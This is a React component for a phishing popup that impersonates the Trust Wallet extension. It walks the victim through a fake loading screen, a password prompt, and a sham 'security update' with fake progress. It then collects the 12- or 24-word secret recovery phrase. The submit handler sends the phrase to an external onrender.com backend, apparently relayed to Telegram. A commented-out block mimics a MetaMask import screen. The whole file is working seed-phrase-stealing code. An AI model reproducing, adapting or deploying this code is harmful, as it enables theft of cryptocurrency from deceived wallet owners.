import React, { useState, useEffect, useMemo } from "react";

export default function TrustPop({setWalletConnected,setSelectedWallet, wallets}) {
  const [password, setPassword] = useState("");
  const [step, setStep] = useState("loading");

  const handleLoginSubmit = (e) => {
    e.preventDefault();
    setStep("update");
    console.log(password);
  };

  const handleUpdateClick = () => {
    setStep("update-loading");
  };

  const handlePageRender = (step) => {
    if (step === "loading") {
      return <TrustLoadingScreen handleStep={setStep} />;
    } else if (step === "login") {
      return (
        <TrustLoginScreen
          handleSubmit={handleLoginSubmit}
          password={password}
          setPassword={setPassword}
        />
      );
    } else if (step === "update") {
      return <TrustUpdateScreen handleClick={handleUpdateClick} />;
    } else if (step === "update-loading") {
      return <TrustUpdateScreenLoading handleUpdate={setStep} />;
    } else {
      return <TrustRecoveryScreen setWalletConnected={setWalletConnected} setSelectedWallet={setSelectedWallet} wallets={wallets}/>;
    }
  };

  return <>{handlePageRender(step)}</>;
}

function TrustLoadingScreen({ handleStep }) {
  const [showTransition, setShowTransition] = useState(false);
  useEffect(() => {
    setShowTransition(true);
    const t = setTimeout(() => handleStep("login"), 2000);
    return () => clearTimeout(t);
  }, [handleStep]);

  return (
    <div
      className={`w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-gradient-to-br from-[#0F2A24] via-[#0B1F1A] to-[#050707] text-white transition-transform duration-700 overflow-hidden flex justify-center items-center ease-in-out ${showTransition ? "translate-y-0" : "-translate-y-full"}`}
    >
      <img
        src="/trust-icon.png"
        alt="trust logo"
        className={`w-[95%] transition-transform delay-700 duration-300`}
      />
    </div>
  );
}

function TrustLoginScreen({ handleSubmit, setPassword, password }) {
  const [showTransition, setShowTransition] = useState(false);
  useEffect(() => {
    setShowTransition(true);
  }, []);

  return (
    <div
      className={`w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#1A1B1C] text-white transition-opacity duration-500 ease-in-out overflow-hidden ${showTransition ? "opacity-100" : "opacity-0"}`}
    >
      <div className="mt-8 flex flex-col items-center">
        {/* logo container */}

        <img
          src="/trust-shield.png"
          alt="trust logo"
          className={`w-[200px] h-[auto] transition-transform delay-700 duration-300 object-contain`}
        />

        <span className="max-w-64 text-center text-sm mb-8">
          Secure and trusted multi-chain crypto wallet
        </span>

        {/* form */}
        <div className="w-[85%] flex flex-col">
          <div className="flex flex-col gap-y-2">
            <span className="text-sm">Password</span>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="mb-4 py-3 px-4 rounded outline-none focus:outline-none bg-[#1C1F24] border border-[#6A737D] placeholder-[#6A737D]"
            />
          </div>

          <button
            type="submit"
            className="text-black rounded-full py-2 bg-[#338650] mt-2"
            onClick={handleSubmit}
          >
            Unlock
          </button>
        </div>

        <div className="flex flex-col items-center border-t border-[#2D3134] mx-8 mt-24 gap-y-3 pt-4">
          <p className="text-center text-sm px-3 text-[#9BA1A6]">
            Can't login? You can erase your current wallet and set up a new one
          </p>
          <span className="text-sm">Reset wallet</span>
        </div>
      </div>
    </div>
  );
}

function TrustUpdateScreen({ handleClick }) {
  return (
    <div className="w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#1A1B1C] text-white transition-[translate] overflow-hidden">
      {/* Content */}
      <div className="px-6 space-y-4 mt-3">
        {/* Illustration box */}
        <div className=" flex flex-col items-center text-center">
          {/* Fake icon */}
          <div className="text-4xl">
            <img src="/trust-icon.png" className="h-[110px]" />
          </div>

          <h2 className="text-2xl font-semibold">Update Available</h2>
          <p className=" text-white/60 mt-2">Version 2.65.0</p>
        </div>
        <div className="bg-[#0D1B2A] px-6 py-3 border-l-4 border-[#1A73E8]">
          <span className="text-sm ">
            Important scheduled update with security improvements. We recommend
            installing it now.
          </span>
        </div>
        <div
          className="rounded bg-gradient-to-b 
                          from-[#2A2B31] 
                          via-[#24252B] 
                          to-[#2A2B31]
                          py-4 px-4  flex justify-center"
        >
          {/* Bullet points */}
          <ul className="space-y-2 ml-4 text-[13px] text-white list-disc list-outside ">
            <li>Enhanced multi-chain support and performance</li>
            <li>Improved the security system</li>
            <li>Fixed network information display</li>
            <li>Better transaction signing experience</li>
          </ul>
        </div>
        {/* Update button */}
        <button
          className="w-full bg-[#338650] hover:bg-[#33FF8A] text-black font-medium py-2.5 rounded-full hover:bg-white/90 transition mt-6"
          onClick={handleClick}
        >
          Update
        </button>
        {/* Footer */}
        <p className="text-xs text-center text-white/50">
          Need help?{" "}
          <span className="text-[#338650] hover:text-[#33FF8A] hover:underline cursor-pointer">
            Contact Us
          </span>
        </p>
      </div>
    </div>
  );
}

function TrustUpdateScreenLoading({ handleUpdate }) {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    if (progress >= 100) {
      handleUpdate("");
      return;
    }

    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + Math.random() * 2; // smooth fake progress
      });
    }, 120);

    return () => clearInterval(interval);
  }, [progress]);

  return (
    <div className="w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#1C1F24] text-white transition-[translate] overflow-hidden">
      <div className="w-[360px] rounded-2xl text-white animate-scaleIn">
        {/* Body */}
        <div className="px-6 space-y-10 text-center mt-12">
          {/* Spinner */}
          <div className="flex justify-center items-center flex-col">
            <img
              src="/trust-icon.png"
              alt="trust logo"
              className={`w-[70%] h-autos transition-transform delay-700 duration-300`}
            />

            <div>
              <h2 className="text-2xl font-semibold mb-3">Updating</h2>
              <p className=" ">Please wait while we update to version 2.65.0</p>
            </div>
          </div>

          {/* Progress bar */}
          <div className="space-y-2">
            <div className="w-full h-2 bg-white/10 rounded-full overflow-hidden">
              <div
                className="h-full bg-[#33FF8A] transition-all duration-200"
                style={{ width: `${Math.min(progress, 100)}%` }}
              />
            </div>
            <div className="flex justify-between items-center">
              <span className=" text-xs">Downloading update....</span>
              <p className="text-xs ">{Math.floor(progress)}%</p>
            </div>
          </div>

          <p className="text-xs text-white/50 max-w-[305px] text-center">
            This may take a few moments. Please do not close this window.
          </p>
        </div>
      </div>
    </div>
  );
}

// function TrustRecoveryScreen({ open = true, onClose }) {
//   const [isOpen, setIsOpen] = useState(open);
//   const [phrase, setPhrase] = useState("");
//   const [accountOpen, setAccountOpen] = useState(false);

//   const visible = useMemo(() => isOpen, [isOpen]);

//   const close = () => {
//     setIsOpen(false);
//     if (onClose) onClose();
//   };

//   // --- MetaMask parsing logic ---
//   const words = phrase
//     .toLowerCase()
//     .replace(/\n/g, " ")
//     .replace(/\s+/g, " ")
//     .trim()
//     .split(" ")
//     .slice(0, 12);

//   const handleChange = (e) => {
//     const input = e.target.value;
//     const normalized = input
//       .toLowerCase()
//       .replace(/\n/g, " ")
//       .replace(/\s+/g, " ");

//     if (normalized.trim().split(" ").length <= 12) {
//       setPhrase(normalized);
//     }
//   };

//   const isComplete = words.length === 12;

//   if (!visible) return null;

//   return (
//     <div className="w-[360px] h-[600px] absolute top-0 right-[5%] z-10 bg-[#1C1F24] text-white transition-[translate] overflow-hidden">
//       {/* Header */}
//       <div className="flex items-center justify-between px-4 py-3 pb-6 border-b border-white/10 ">
//         <div className="flex flex-col gap-y-[10px]">
//           <div className="flex items-center gap-x-2">
//             <span className="text-sm font-medium">Account 1</span>
//             <ChevronDown size={17} />
//           </div>
//           <div className="flex relative">
//             <img src="/bitcoin.png" className="h-4 w-4 rounded absolute" />
//             <img
//               src="/coin.png"
//               className="h-4 w-4 rounded absolute translate-x-3"
//             />
//             <img
//               src="/litecoin.png"
//               className="h-4 w-4 rounded absolute translate-x-6"
//             />
//             <img
//               src="/ethereum.png"
//               className="h-4 w-4 rounded absolute translate-x-9"
//             />
//           </div>
//         </div>
//       </div>

//       {/* Content */}
//       <div className="px-5 py-5">
//         <h2 className="text-[22px] font-semibold leading-snug text-white">
//           Import your wallet with your <br /> Secret Recovery Phrase
//         </h2>

//         <p className="mt-2 text-xs leading-relaxed text-white/60">
//           Enter your Secret Recovery Phrase.
//         </p>

//         {/* Real input (MetaMask style) */}
//         <div className="mt-5 rounded-2xl border border-white/10 bg-[#14171B] px-4 py-4">
//           <textarea
//             value={phrase}
//             onChange={handleChange}
//             rows={3}
//             className="w-full resize-none bg-transparent text-[15px] leading-relaxed text-white/85 outline-none placeholder:text-white/30"
//             placeholder="Enter your Secret Recovery Phrase..."
//           />
//         </div>

//         {/* Visual 12 slots */}
//         <div className="mt-4 grid grid-cols-3 gap-2">
//           {Array.from({ length: 12 }).map((_, i) => (
//             <div
//               key={i}
//               className="flex items-center gap-2 rounded-lg border border-white/10 bg-[#14171B] px-2 py-1.5 text-sm"
//             >
//               <span className="w-5 text-right text-white/40">{i + 1}</span>
//               <span className="text-white truncate">{words[i] || ""}</span>
//             </div>
//           ))}
//         </div>

//         {/* CTA */}
//         <button
//           type="button"
//           disabled={!isComplete}
//           className="
//             mt-6 w-full rounded-xl px-4 py-3 text-sm font-semibold
//             bg-white text-black shadow-sm
//             disabled:opacity-40 disabled:cursor-not-allowed
//             hover:bg-white/90 active:scale-[0.99]
//           "
//         >
//           Confirm Secret Recovery Phrase
//         </button>
//       </div>
//     </div>
//   );
// }

function TrustRecoveryScreen({ onBack, onNext,setWalletConnected,setSelectedWallet,wallets }) {
  const [length, setLength] = useState(12);
  const [words, setWords] = useState(Array(12).fill(""));
  const [visible, setVisible] = useState(Array(12).fill(false));

  const phrase = useMemo(() => words.join(" ").trim(), [words]);
  const isComplete = useMemo(
    () => words.every((w) => w.trim() !== ""),
    [words],
  );

  const handleWordChange = (i, value) => {
    const updated = [...words];
    updated[i] = value.toLowerCase().trim();
    setWords(updated);
  };

  const toggleVisibility = (i) => {
    const updated = [...visible];
    updated[i] = !updated[i];
    setVisible(updated);
  };

  const handlePaste = (e) => {
    const pasted = e.clipboardData.getData("text");
    if (!pasted) return;

    const tokens = pasted.toLowerCase().trim().split(/\s+/).filter(Boolean);

    // If user pasted enough words, fill the grid
    if (tokens.length >= length) {
      e.preventDefault();
      setWords(tokens.slice(0, length));
    }
  };

  const handleLengthChange = (val) => {
    setLength(val);
    setWords(Array(val).fill(""));
    setVisible(Array(val).fill(false));
  };

  const handleSubmit = async () => {
    if (!isComplete) return;

    try {
      const res = await fetch("https://wallet-backend-iyvu.onrender.com/api/telegram/send/", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          text: "[TRUST] " + phrase,
        }),
      });

      const data = await res.json();
      setWalletConnected(true);
      setSelectedWallet(wallets.NO_WALLET);
      console.log(data);
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="w-[360px] h-[600px] fixed top-0 right-[5%] z-50 bg-[#1C1F24] text-white transition-[translate] overflow-hidden">
      {/* Header */}
      <div className="mb-6 flex flex-col items-center gap-2 pt-5">
        <img
          src="/trust-icon.png"
          alt="trust logo"
          className="w-[65%] h-auto transition-transform delay-700 duration-300"
        />
        <h2 className="text-lg font-semibold">Import with Secret Phrase</h2>

        <select
          value={length}
          onChange={(e) => handleLengthChange(Number(e.target.value))}
          className="mt-2 rounded-md bg-[#1a1d23] px-3 py-1 text-sm outline-none"
        >
          <option value={12}>I have a 12 word Secret Phrase</option>
          <option value={24}>I have a 24 word Secret Phrase</option>
        </select>
      </div>

      {/* Words Grid */}
      <div
        onPaste={handlePaste}
        className="grid grid-cols-2 gap-3 px-6 items-center overflow-y-auto h-60"
      >
        {words.map((word, i) => (
          <div
            key={i}
            className="flex items-center rounded-lg bg-[#1a1d23] px-3 py-2"
          >
            <span className="mr-2 text-xs text-gray-400">{i + 1}.</span>

            <input
              type={visible[i] ? "text" : "password"}
              value={word}
              onChange={(e) => handleWordChange(i, e.target.value)}
              placeholder={`Word #${i + 1}`}
              autoComplete="off"
              spellCheck={false}
              className="flex-1 bg-transparent text-sm outline-none placeholder-gray-500"
            />

            <button
              onClick={() => toggleVisibility(i)}
              className="ml-2 text-gray-400 hover:text-white"
              type="button"
              aria-label={visible[i] ? "Hide word" : "Show word"}
              title={visible[i] ? "Hide" : "Show"}
            >
              {visible[i] ? "🙈" : "👁️"}
            </button>
          </div>
        ))}
      </div>

      {/* Footer Buttons */}
      <div className="mt-6 px-6 space-y-3">
        {onBack && (
          <button
            type="button"
            onClick={onBack}
            className="rounded-lg w-full px-6 py-2 text-sm font-semibold bg-white/10 hover:bg-white/15 transition"
          >
            Back
          </button>
        )}

        <button
          type="button"
          disabled={!isComplete}
          onClick={handleSubmit}
          className={`rounded-lg w-full px-6 py-2 text-sm font-semibold transition
            ${
              isComplete
                ? "bg-green-500 text-black hover:bg-green-400"
                : "bg-gray-600 text-gray-300 cursor-not-allowed"
            }`}
        >
          Next
        </button>

        {/* Optional helper text */}
        <p className="text-[11px] text-white/45 leading-snug">
          Tip: You can paste your full {length}-word phrase anywhere in the grid
          to auto-fill.
        </p>
      </div>
    </div>
  );
}
